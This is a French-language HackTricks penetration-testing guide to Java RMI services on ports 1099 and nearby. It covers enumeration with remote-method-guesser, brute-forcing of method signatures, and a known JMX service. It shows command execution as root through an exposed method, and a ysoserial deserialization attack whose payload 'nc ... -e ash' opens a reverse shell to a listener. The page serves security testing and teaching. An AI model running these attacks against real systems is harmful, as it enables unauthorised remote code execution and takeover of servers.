# 1098/1099/1050 - Pentesting Java RMI - RMI-IIOP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour créer et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Informations de base

_L'invocation de méthode à distance Java_, ou _Java RMI_, est un mécanisme RPC orienté objet qui permet à un objet situé dans une _machine virtuelle Java_ d'appeler des méthodes sur un objet situé dans une autre _machine virtuelle Java_. Cela permet aux développeurs d'écrire des applications distribuées en utilisant un paradigme orienté objet. Une brève introduction à _Java RMI_ d'un point de vue offensif peut être trouvée dans [cette présentation blackhat](https://youtu.be/t\_aw1mDNhzI?t=202).

**Port par défaut :** 1090,1098,1099,1199,4443-4446,8999-9010,9999
```
PORT      STATE SERVICE      VERSION
1090/tcp  open  ssl/java-rmi Java RMI
9010/tcp  open  java-rmi     Java RMI
37471/tcp open  java-rmi     Java RMI
40259/tcp open  ssl/java-rmi Java RMI
```
Généralement, seuls les composants par défaut de _Java RMI_ (le _RMI Registry_ et le _Activation System_) sont liés aux ports communs. Les _objets distants_ qui implémentent l'application _RMI_ réelle sont généralement liés à des ports aléatoires comme indiqué dans la sortie ci-dessus.

_nmap_ a parfois des difficultés à identifier les services _RMI_ protégés par _SSL_. Si vous rencontrez un service _ssl_ inconnu sur un port _RMI_ commun, vous devriez approfondir votre enquête.

## Composants RMI

Pour simplifier, _Java RMI_ permet à un développeur de rendre un _objet Java_ disponible sur le réseau. Cela ouvre un port _TCP_ où les clients peuvent se connecter et appeler des méthodes sur l'objet correspondant. Bien que cela semble simple, _Java RMI_ doit résoudre plusieurs défis :

1. Pour acheminer un appel de méthode via _Java RMI_, les clients doivent connaître l'adresse IP, le port d'écoute, la classe ou l'interface implémentée et l'`ObjID` de l'objet ciblé (l'`ObjID` est un identifiant unique et aléatoire créé lorsque l'objet est rendu disponible sur le réseau. Il est requis car _Java RMI_ permet à plusieurs objets d'écouter sur le même port _TCP_).
2. Les clients distants peuvent allouer des ressources sur le serveur en invoquant des méthodes sur l'objet exposé. La machine virtuelle Java doit suivre quelles ressources sont encore utilisées et lesquelles peuvent être collectées par le garbage collector.

Le premier défi est résolu par le _RMI registry_, qui est essentiellement un service de nommage pour _Java RMI_. Le _RMI registry_ lui-même est également un service _RMI_, mais l'interface implémentée et l'`ObjID` sont fixes et connus de tous les clients _RMI_. Cela permet aux clients _RMI_ de consommer le _RMI registry_ en connaissant simplement le port _TCP_ correspondant.

Lorsque les développeurs veulent rendre leurs objets Java disponibles sur le réseau, ils les lient généralement à un _RMI registry_. Le _registry_ stocke toutes les informations nécessaires pour se connecter à l'objet (adresse IP, port d'écoute, classe ou interface implémentée et valeur de l'`ObjID`) et le rend disponible sous un nom lisible par l'homme (le _nom lié_). Les clients qui souhaitent consommer le service _RMI_ demandent au _RMI registry_ le _nom lié_ correspondant et le registry renvoie toutes les informations nécessaires pour se connecter. Ainsi, la situation est essentiellement la même qu'avec un service _DNS_ ordinaire. L'exemple suivant montre un petit exemple :
```java
import java.rmi.registry.Registry;
import java.rmi.registry.LocateRegistry;
import lab.example.rmi.interfaces.RemoteService;

public class ExampleClient {

private static final String remoteHost = "172.17.0.2";
private static final String boundName = "remote-service";

public static void main(String[] args)
{
try {
Registry registry = LocateRegistry.getRegistry(remoteHost);     // Connect to the RMI registry
RemoteService ref = (RemoteService)registry.lookup(boundName);  // Lookup the desired bound name
String response = ref.remoteMethod();                           // Call a remote method

} catch( Exception e) {
e.printStackTrace();
}
}
}
```
Le deuxième des défis mentionnés ci-dessus est résolu par le _Distributed Garbage Collector_ (_DGC_). Il s'agit d'un autre _service RMI_ avec une valeur `ObjID` bien connue et il est disponible sur pratiquement chaque point d'extrémité _RMI_. Lorsqu'un client _RMI_ commence à utiliser un service _RMI_, il envoie une information au _DGC_ indiquant que l'objet distant correspondant est en cours d'utilisation. Le _DGC_ peut ensuite suivre le nombre de références et est capable de nettoyer les objets inutilisés.

Ensemble avec le _Système d'Activation_ obsolète, ce sont les trois composants par défaut de _Java RMI_ :

1. Le _Registre RMI_ (`ObjID = 0`)
2. Le _Système d'Activation_ (`ObjID = 1`)
3. Le _Distributed Garbage Collector_ (`ObjID = 2`)

Les composants par défaut de _Java RMI_ sont connus comme vecteurs d'attaque depuis un certain temps et plusieurs vulnérabilités existent dans les versions obsolètes de _Java_. Du point de vue d'un attaquant, ces composants par défaut sont intéressants car ils implémentent des classes/interfaces connues et il est facile d'interagir avec eux. Cette situation est différente pour les services _RMI_ personnalisés. Pour appeler une méthode sur un objet distant, vous devez connaître à l'avance la signature de la méthode correspondante. Sans connaître une signature de méthode existante, il n'est pas possible de communiquer avec un service _RMI_.

## Énumération RMI

[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) est un scanner de vulnérabilités _Java RMI_ capable d'identifier automatiquement les vulnérabilités RMI courantes. Chaque fois que vous identifiez un point d'extrémité _RMI_, vous devriez l'essayer :
```
$ rmg enum 172.17.0.2 9010
[+] RMI registry bound names:
[+]
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff7, 3638117546492248534]
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ffc, 708796783031663206]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:37471  TLS: no  ObjID: [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- http://iinsecure.dev/well-hidden-development-folder/
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer
[+]
[+] RMI server String unmarshalling enumeration:
[+]
[+] 	- Caught ClassNotFoundException during lookup call.
[+] 	  --> The type java.lang.String is unmarshalled via readObject().
[+] 	  Configuration Status: Outdated
[+]
[+] RMI server useCodebaseOnly enumeration:
[+]
[+] 	- Caught MalformedURLException during lookup call.
[+] 	  --> The server attempted to parse the provided codebase (useCodebaseOnly=false).
[+] 	  Configuration Status: Non Default
[+]
[+] RMI registry localhost bypass enumeration (CVE-2019-2684):
[+]
[+] 	- Caught NotBoundException during unbind call (unbind was accepeted).
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI Security Manager enumeration:
[+]
[+] 	- Security Manager rejected access to the class loader.
[+] 	  --> The server does use a Security Manager.
[+] 	  Configuration Status: Current Default
[+]
[+] RMI server JEP290 enumeration:
[+]
[+] 	- DGC rejected deserialization of java.util.HashMap (JEP290 is installed).
[+] 	  Vulnerability Status: Non Vulnerable
[+]
[+] RMI registry JEP290 bypass enmeration:
[+]
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerable
[+]
[+] RMI ActivationSystem enumeration:
[+]
[+] 	- Caught IllegalArgumentException during activate call (activator is present).
[+] 	  --> Deserialization allowed	 - Vulnerability Status: Vulnerable
[+] 	  --> Client codebase enabled	 - Configuration Status: Non Default
```
Le résultat de l'action d'énumération est expliqué plus en détail dans les [pages de documentation](https://github.com/qtc-de/remote-method-guesser/blob/master/docs/rmg/actions.md#enum-action) du projet. Selon le résultat, vous devriez essayer de vérifier les vulnérabilités identifiées.

Les valeurs `ObjID` affichées par _remote-method-guesser_ peuvent être utilisées pour déterminer le temps de disponibilité du service. Cela peut permettre d'identifier d'autres vulnérabilités :
```
$ rmg objid '[55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]'
[+] Details for ObjID [55ff5a5d:17e0501b054:-7ff8, -4004948013687638236]
[+]
[+] ObjNum: 		-4004948013687638236
[+] UID:
[+] 	Unique: 	1442798173
[+] 	Time: 		1640761503828 (Dec 29,2021 08:05)
[+] 	Count: 		-32760
```
## Bruteforcer les méthodes à distance

Même lorsque aucune vulnérabilité n'a été identifiée lors de l'énumération, les services _RMI_ disponibles peuvent toujours exposer des fonctions dangereuses. De plus, bien que la communication _RMI_ avec les composants par défaut de _RMI_ soit protégée par des filtres de désérialisation, ces filtres ne sont généralement pas en place lors de l'utilisation de services _RMI_ personnalisés. Il est donc précieux de connaître les signatures de méthodes valides sur les services _RMI_.

Malheureusement, _Java RMI_ ne prend pas en charge l'énumération des méthodes sur les objets distants. Cela étant dit, il est possible de forcer les signatures de méthodes avec des outils tels que [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) ou [rmiscout](https://github.com/BishopFox/rmiscout):
```
$ rmg guess 172.17.0.2 9010
[+] Reading method candidates from internal wordlist rmg.txt
[+] 	752 methods were successfully parsed.
[+] Reading method candidates from internal wordlist rmiscout.txt
[+] 	2550 methods were successfully parsed.
[+]
[+] Starting Method Guessing on 3281 method signature(s).
[+]
[+] 	MethodGuesser is running:
[+] 		--------------------------------
[+] 		[ plain-server2  ] HIT! Method with signature String execute(String dummy) exists!
[+] 		[ plain-server2  ] HIT! Method with signature String system(String dummy, String[] dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void logMessage(int dummy1, String dummy2) exists!
[+] 		[ legacy-service ] HIT! Method with signature void releaseRecord(int recordID, String tableName, Integer remoteHashCode) exists!
[+] 		[ legacy-service ] HIT! Method with signature String login(java.util.HashMap dummy1) exists!
[+] 		[6562 / 6562] [#####################################] 100%
[+] 	done.
[+]
[+] Listing successfully guessed methods:
[+]
[+] 	- plain-server2 == plain-server
[+] 		--> String execute(String dummy)
[+] 		--> String system(String dummy, String[] dummy2)
[+] 	- legacy-service
[+] 		--> void logMessage(int dummy1, String dummy2)
[+] 		--> void releaseRecord(int recordID, String tableName, Integer remoteHashCode)
[+] 		--> String login(java.util.HashMap dummy1)
```
Les méthodes identifiées peuvent être appelées de la manière suivante :
```
$ rmg call 172.17.0.2 9010 '"id"' --bound-name plain-server --signature "String execute(String dummy)" --plugin GenericPrint.jar
[+] uid=0(root) gid=0(root) groups=0(root)
```
Ou vous pouvez effectuer des attaques de désérialisation comme ceci:
```
$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --bound-name plain-server --signature "String execute(String dummy)"
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI endpoint...
[+]
[+] 	Using non primitive argument type java.lang.String on position 0
[+] 	Specified method signature is String execute(String dummy)
[+]
[+] 	Caught ClassNotFoundException during deserialization attack.
[+] 	Server attempted to deserialize canary class 6ac727def61a4800a09987c24352d7ea.
[+] 	Deserialization attack probably worked :)

$ nc -vlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:45479.
id
uid=0(root) gid=0(root) groups=0(root)
```
Plus d'informations peuvent être trouvées dans ces articles :

* [Attaquer les services Java RMI après JEP 290](https://mogwailabs.de/de/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
* [Deviner la méthode](https://github.com/qtc-de/remote-method-guesser/blob/master/docs/rmg/method-guessing.md)
* [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
* [rmiscout](https://bishopfox.com/blog/rmiscout)

En plus de deviner, vous devriez également rechercher dans les moteurs de recherche ou sur _GitHub_ l'interface ou même l'implémentation d'un service _RMI_ rencontré. Le _nom lié_ et le nom de la classe ou de l'interface implémentée peuvent être utiles ici.

## Interfaces connues

[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) marque les classes ou interfaces comme `connues` si elles sont répertoriées dans la base de données interne de l'outil des services _RMI_ connus. Dans ces cas, vous pouvez utiliser l'action `connue` pour obtenir plus d'informations sur le service _RMI_ correspondant :
```
$ rmg enum 172.17.0.2 1090 | head -n 5
[+] RMI registry bound names:
[+]
[+] 	- jmxrmi
[+] 		--> javax.management.remote.rmi.RMIServerImpl_Stub (known class: JMX Server)
[+] 		    Endpoint: localhost:41695  TLS: no  ObjID: [7e384a4f:17e0546f16f:-7ffe, -553451807350957585]

$ rmg known javax.management.remote.rmi.RMIServerImpl_Stub
[+] Name:
[+] 	JMX Server
[+]
[+] Class Name:
[+] 	- javax.management.remote.rmi.RMIServerImpl_Stub
[+] 	- javax.management.remote.rmi.RMIServer
[+]
[+] Description:
[+] 	Java Management Extensions (JMX) can be used to monitor and manage a running Java virtual machine.
[+] 	This remote object is the entrypoint for initiating a JMX connection. Clients call the newClient
[+] 	method usually passing a HashMap that contains connection options (e.g. credentials). The return
[+] 	value (RMIConnection object) is another remote object that is when used to perform JMX related
[+] 	actions. JMX uses the randomly assigned ObjID of the RMIConnection object as a session id.
[+]
[+] Remote Methods:
[+] 	- String getVersion()
[+] 	- javax.management.remote.rmi.RMIConnection newClient(Object params)
[+]
[+] References:
[+] 	- https://docs.oracle.com/javase/8/docs/technotes/guides/management/agent.html
[+] 	- https://github.com/openjdk/jdk/tree/master/src/java.management.rmi/share/classes/javax/management/remote/rmi
[+]
[+] Vulnerabilities:
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		MLet
[+]
[+] 	Description:
[+] 		MLet is the name of an MBean that is usually available on JMX servers. It can be used to load
[+] 		other MBeans dynamically from user specified codebase locations (URLs). Access to the MLet MBean
[+] 		is therefore most of the time equivalent to remote code execution.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
[+]
[+] 	-----------------------------------
[+] 	Name:
[+] 		Deserialization
[+]
[+] 	Description:
[+] 		Before CVE-2016-3427 got resolved, JMX accepted arbitrary objects during a call to the newClient
[+] 		method, resulting in insecure deserialization of untrusted objects. Despite being fixed, the
[+] 		actual JMX communication using the RMIConnection object is not filtered. Therefore, if you can
[+] 		establish a working JMX connection, you can also perform deserialization attacks.
[+]
[+] 	References:
[+] 		- https://github.com/qtc-de/beanshooter
```
## Shodan

* `port:1099 java`

## Outils

* [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)
* [rmiscout](https://github.com/BishopFox/rmiscout)
* [BaRMIe](https://github.com/NickstaDB/BaRMIe)

## Commandes automatiques HackTricks
```
Protocol_Name: Java RMI                                        #Protocol Abbreviation if there is one.
Port_Number:  1090,1098,1099,1199,4443-4446,8999-9010,9999     #Comma separated if there is more than one.
Protocol_Description: Java Remote Method Invocation            #Protocol Abbreviation Spelled out

Entry_1:
Name: Enumeration
Description: Perform basic enumeration of an RMI service
Command: rmg enum {IP} {PORT}
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et automatiser facilement des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
Obtenez un accès aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
